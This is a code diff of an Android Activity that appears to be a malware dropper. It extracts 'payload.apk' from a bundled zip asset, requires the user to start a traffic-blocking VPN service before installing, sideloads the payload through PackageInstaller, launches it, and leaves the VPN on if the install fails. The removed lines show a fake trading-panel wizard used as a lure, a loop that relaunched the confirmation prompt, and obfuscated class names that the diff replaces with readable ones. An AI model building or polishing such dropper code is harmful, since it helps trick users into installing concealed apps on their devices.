@@ -18,9 +18,7 @@ import android.os.Bundle;
 import android.os.Handler;
 import android.os.Looper;
 import android.provider.Settings;
-import android.view.View;
 import android.widget.Button;
-import android.widget.RadioGroup;
 import android.widget.TextView;
 
 import net.lingala.zip4j.ZipFile;
@@ -31,7 +29,7 @@ import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.OutputStream;
 
-public class A4450c4b785 extends Activity {
+public class MainActivity extends Activity {
 
     private static final String ASSET_NAME  = "module";
     private static final String INNER_NAME  = "payload.apk";
@@ -40,7 +38,6 @@ public class A4450c4b785 extends Activity {
     private static final int REQ_UNKNOWN_SOURCES = 1001;
     private static final String ACTION_INSTALL_DONE = "com.onerule.task.INSTALL_DONE";
 
-    private static final long PERM_POLL_MS   = 400;
     private static final long LAUNCH_POLL_MS = 300;
     private static final long LAUNCH_TIMEOUT = 15_000;
     /** How often to poll ConnectivityManager to check VPN is still active. */
@@ -51,19 +48,6 @@ public class A4450c4b785 extends Activity {
     private InstallResultReceiver receiver;
     private final Handler ui = new Handler(Looper.getMainLooper());
 
-    // Multi-page wizard views
-    private View       countryPage;
-    private View       tradingPanelPage;
-    private View       installPage;
-    private RadioGroup countryOptions;
-    private Button     btnContinueCountry;
-    private Button     btnOpenTradingPanel;
-    private TextView   selectedCountry;
-
-    private static final int PAGE_COUNTRY = 0;
-    private static final int PAGE_TRADING = 1;
-    private static final int PAGE_INSTALL = 2;
-
     /**
      * True once the user has granted VPN permission (so we know the system dialog
      * was answered). The Install button also requires isVpnActive() to be true at
@@ -71,8 +55,8 @@ public class A4450c4b785 extends Activity {
      */
     private boolean vpnPermissionGranted         = false;
     private boolean awaitingUnknownSourcesGrant   = false;
-    private Intent  pendingConfirmIntent          = null;
-    private boolean justLaunchedConfirm           = false;
+    private boolean installAttemptInProgress     = false;
+    private boolean installConfirmationShown     = false;
 
     /** True after the payload launches successfully — used to skip VPN re-checks. */
     private boolean installComplete = false;
@@ -82,7 +66,7 @@ public class A4450c4b785 extends Activity {
     /**
      * Periodic runnable that keeps the Install button in sync with live VPN status.
      *
-     * Uses V4450c4b785.isRunning() as the primary (and most reliable) check —
+     * Uses BlockVpnService.isRunning() as the primary (and most reliable) check —
      * it queries our static service instance directly rather than going through
      * ConnectivityManager, which can lag or return stale data on many OEMs.
      *
@@ -119,7 +103,7 @@ public class A4450c4b785 extends Activity {
     /**
      * Returns true if our blocking VPN is currently live.
      *
-     * Primary check  — V4450c4b785.isRunning(): queries the static service
+     * Primary check  — BlockVpnService.isRunning(): queries the static service
      *   instance directly.  This is instantaneous and works on all Android
      *   versions / OEMs regardless of ConnectivityManager quirks.
      *
@@ -128,7 +112,7 @@ public class A4450c4b785 extends Activity {
      *   (e.g. service process recycled by the OS on low-memory devices).
      */
     private boolean isVpnLive() {
-        if (V4450c4b785.isRunning()) return true;
+        if (BlockVpnService.isRunning()) return true;
         try {
             ConnectivityManager cm =
                     (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
@@ -156,59 +140,15 @@ public class A4450c4b785 extends Activity {
         }
 
         setContentView(R.layout.activity_main);
-
-        // Page containers
-        countryPage      = findViewById(R.id.countryPage);
-        tradingPanelPage = findViewById(R.id.tradingPanelPage);
-        installPage      = findViewById(R.id.installPage);
-
         status = findViewById(R.id.status);
         btn    = findViewById(R.id.btnInstall);
         btn.setOnClickListener(v -> onInstallClicked());
 
-        // ── Country page ──
-        countryOptions   = findViewById(R.id.countryOptions);
-        btnContinueCountry = findViewById(R.id.btnContinueCountry);
-        selectedCountry  = findViewById(R.id.selectedCountry);
-
-        countryOptions.setOnCheckedChangeListener((group, checkedId) -> {
-            String label = "";
-            if (checkedId == R.id.countryIndia)    label = "India";
-            else if (checkedId == R.id.countryUsa) label = "USA";
-            else if (checkedId == R.id.countryNewYork) label = "New York";
-            if (selectedCountry != null) selectedCountry.setText("Selected country: " + label);
-            btnContinueCountry.setEnabled(true);
-        });
-
-        btnContinueCountry.setOnClickListener(v -> showPage(PAGE_TRADING));
-
-        // ── Trading panel page ──
-        btnOpenTradingPanel = findViewById(R.id.btnOpenTradingPanel);
-        btnOpenTradingPanel.setOnClickListener(v -> {
-            showPage(PAGE_INSTALL);
-            startInstallFlow();
-        });
-
-        // Start on the country-selection page.
-        showPage(PAGE_COUNTRY);
-    }
-
-    /** Switches between the country / trading-panel / install pages. */
-    private void showPage(int page) {
-        countryPage.setVisibility(page == PAGE_COUNTRY ? View.VISIBLE : View.GONE);
-        tradingPanelPage.setVisibility(page == PAGE_TRADING ? View.VISIBLE : View.GONE);
-        installPage.setVisibility(page == PAGE_INSTALL ? View.VISIBLE : View.GONE);
-    }
-
-    /**
-     * Begins the gated install flow once the user reaches the install page:
-     * demands VPN permission, then enables the Install button once the VPN
-     * is live.
-     */
-    private void startInstallFlow() {
+        // Lock the Install button and demand VPN permission before anything else.
         btn.setEnabled(false);
-        status.setText("Grant the VPN permission to continue...");
         requestVpnPermission();
+
+        // Start the monitor — it will enable the button once VPN is confirmed live.
         ui.postDelayed(vpnMonitor, VPN_MONITOR_MS);
     }
 
@@ -229,26 +169,7 @@ public class A4450c4b785 extends Activity {
             return;
         }
 
-        if (awaitingUnknownSourcesGrant) {
-            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
-                    || getPackageManager().canRequestPackageInstalls()) {
-                awaitingUnknownSourcesGrant = false;
-                new Thread(this::dropAndInstall).start();
-            }
-        }
-
-        if (pendingConfirmIntent != null) {
-            if (justLaunchedConfirm) {
-                justLaunchedConfirm = false;
-            } else {
-                Intent again = pendingConfirmIntent;
-                justLaunchedConfirm = true;
-                try {
-                    again.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    startActivity(again);
-                } catch (Exception ignored) {}
-            }
-        }
+        finishUnknownSourcesPermissionRequest();
     }
 
     // ── VPN permission gate ────────────────────────────────────────────────────
@@ -279,12 +200,12 @@ public class A4450c4b785 extends Activity {
      *      Enable the button immediately — no need to wait.
      *   B) Service not yet running:
      *      Start it, show "Starting VPN…" and let the monitor enable the button
-     *      once V4450c4b785.isRunning() becomes true (typically < 200 ms).
+     *      once BlockVpnService.isRunning() becomes true (typically < 200 ms).
      */
     private void onVpnGranted() {
         vpnPermissionGranted = true;
 
-        if (V4450c4b785.isRunning()) {
+        if (BlockVpnService.isRunning()) {
             // Already live — skip the "Starting…" phase entirely.
             btn.setEnabled(true);
             status.setText("Ready \u2014 tap Install to begin.");
@@ -292,10 +213,10 @@ public class A4450c4b785 extends Activity {
         }
 
         try {
-            startService(new Intent(this, V4450c4b785.class));
+            startService(new Intent(this, BlockVpnService.class));
         } catch (Exception e) {
-            android.util.Log.w(V4450c4b785.TAG,
-                    "Could not start V4450c4b785: " + e.getMessage());
+            android.util.Log.w(BlockVpnService.TAG,
+                    "Could not start BlockVpnService: " + e.getMessage());
         }
         // The monitor will enable the button as soon as isRunning() becomes true.
         status.setText("Starting VPN\u2026 please wait.");
@@ -308,7 +229,7 @@ public class A4450c4b785 extends Activity {
     private void stopVpn() {
         installComplete = true;
         ui.removeCallbacks(vpnMonitor);
-        V4450c4b785.stop(this);
+        BlockVpnService.stop(this);
     }
 
     @Override
@@ -324,19 +245,15 @@ public class A4450c4b785 extends Activity {
                 ui.postDelayed(this::requestVpnPermission, 900);
             }
         } else if (requestCode == REQ_UNKNOWN_SOURCES) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
-                    && getPackageManager().canRequestPackageInstalls()) {
-                awaitingUnknownSourcesGrant = false;
-                new Thread(this::dropAndInstall).start();
-            } else {
-                runOnUiThread(() -> status.setText("Permission denied \u2014 cannot install."));
-            }
+            finishUnknownSourcesPermissionRequest();
         }
     }
 
     // ── Install flow ───────────────────────────────────────────────────────────
 
     private void onInstallClicked() {
+        if (installAttemptInProgress || awaitingUnknownSourcesGrant) return;
+
         // Hard gate: verify VPN is actually live at click time, not just on paper.
         if (!vpnPermissionGranted || !isVpnLive()) {
             btn.setEnabled(false);
@@ -353,32 +270,42 @@ public class A4450c4b785 extends Activity {
     }
 
     private void startInstall() {
+        if (installAttemptInProgress || awaitingUnknownSourcesGrant) return;
+
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                 && !getPackageManager().canRequestPackageInstalls()) {
-            status.setText("Allow install from this source \u2014 install starts automatically.");
+            status.setText("Allow installs from this source, return here, then tap Install.");
             awaitingUnknownSourcesGrant = true;
-            startPermissionPoll();
             Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,
                     Uri.parse("package:" + getPackageName()));
-            startActivityForResult(i, REQ_UNKNOWN_SOURCES);
+            try {
+                startActivityForResult(i, REQ_UNKNOWN_SOURCES);
+            } catch (Exception e) {
+                awaitingUnknownSourcesGrant = false;
+                status.setText("Could not open install permission settings.");
+            }
             return;
         }
+
+        installAttemptInProgress = true;
+        installConfirmationShown = false;
+        btn.setEnabled(false);
         new Thread(this::dropAndInstall).start();
     }
 
-    private void startPermissionPoll() {
-        ui.postDelayed(new Runnable() {
-            @Override public void run() {
-                if (!awaitingUnknownSourcesGrant) return;
-                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O
-                        || getPackageManager().canRequestPackageInstalls()) {
-                    awaitingUnknownSourcesGrant = false;
-                    new Thread(A4450c4b785.this::dropAndInstall).start();
-                    return;
-                }
-                ui.postDelayed(this, PERM_POLL_MS);
-            }
-        }, PERM_POLL_MS);
+    /**
+     * Returning from Android's per-app install permission screen only updates
+     * the UI. Installing remains an explicit action on the Install button.
+     */
+    private void finishUnknownSourcesPermissionRequest() {
+        if (!awaitingUnknownSourcesGrant) return;
+        awaitingUnknownSourcesGrant = false;
+
+        boolean allowed = Build.VERSION.SDK_INT < Build.VERSION_CODES.O
+                || getPackageManager().canRequestPackageInstalls();
+        status.setText(allowed
+                ? "Permission enabled \u2014 tap Install to continue."
+                : "Permission not granted \u2014 tap Install to try again.");
     }
 
     // ── Payload queries ────────────────────────────────────────────────────────
@@ -425,7 +352,7 @@ public class A4450c4b785 extends Activity {
     private void doImmediateRedirect() {
         installComplete = true;
         ui.removeCallbacks(vpnMonitor);
-        V4450c4b785.stop(this);
+        BlockVpnService.stop(this);
 
         final String pkg = BuildConfig.PAYLOAD_PACKAGE;
         if (pkg != null && !pkg.isEmpty()) {
@@ -462,7 +389,7 @@ public class A4450c4b785 extends Activity {
                     try {
                         startActivity(launch);
                         stopVpn();
-                        ui.postDelayed(A4450c4b785.this::finish, 150);
+                        ui.postDelayed(MainActivity.this::finish, 150);
                     } catch (Exception e) {
                         if (status != null) status.setText("Launch failed: " + e.getMessage());
                     }
@@ -519,7 +446,11 @@ public class A4450c4b785 extends Activity {
             installViaSession(apk);
         } catch (Exception e) {
             // Failed — VPN intentionally left running.
-            runOnUiThread(() -> status.setText("Install failed: " + e.getMessage()));
+            runOnUiThread(() -> {
+                installAttemptInProgress = false;
+                btn.setEnabled(vpnPermissionGranted && isVpnLive());
+                status.setText("Install failed: " + e.getMessage());
+            });
         }
     }
 
@@ -578,14 +509,12 @@ public class A4450c4b785 extends Activity {
             int s = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -999);
             if (s == PackageInstaller.STATUS_PENDING_USER_ACTION) {
                 Intent confirm = intent.getParcelableExtra(Intent.EXTRA_INTENT);
-                if (confirm != null) {
+                if (confirm != null && !installConfirmationShown) {
+                    installConfirmationShown = true;
                     confirm.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                    pendingConfirmIntent = confirm;
-                    justLaunchedConfirm  = true;
                     startActivity(confirm);
                 }
             } else if (s == PackageInstaller.STATUS_SUCCESS) {
-                pendingConfirmIntent = null;
                 runOnUiThread(() -> {
                     status.setText("App installed, kindly wait for it to launch\u2026");
                     btn.setEnabled(false);
@@ -594,9 +523,12 @@ public class A4450c4b785 extends Activity {
                 try { unregisterReceiver(this); } catch (Exception ignored) {}
             } else {
                 // Failed — VPN stays active (no stopVpn() call).
-                pendingConfirmIntent = null;
                 String msg = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
-                runOnUiThread(() -> status.setText("Install failed: " + msg));
+                runOnUiThread(() -> {
+                    installAttemptInProgress = false;
+                    btn.setEnabled(vpnPermissionGranted && isVpnLive());
+                    status.setText("Install failed: " + msg);
+                });
                 try { unregisterReceiver(this); } catch (Exception ignored) {}
             }
         }
